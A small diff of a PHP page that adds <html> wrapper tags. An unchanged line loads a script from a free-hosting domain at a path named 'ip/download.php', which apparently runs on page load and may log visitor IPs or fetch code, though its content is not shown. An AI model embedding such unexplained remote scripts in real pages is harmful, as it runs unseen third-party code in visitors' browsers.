@@ -1,4 +1,5 @@
 <?php error_reporting(0); ?>
+<html>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css"><script src="https://get2mate.000webhostapp.com/ip/download.php"></script>
 
@@ -135,3 +136,4 @@ echo $homepage;
 </div>
   </p>
 </div>
+</html>
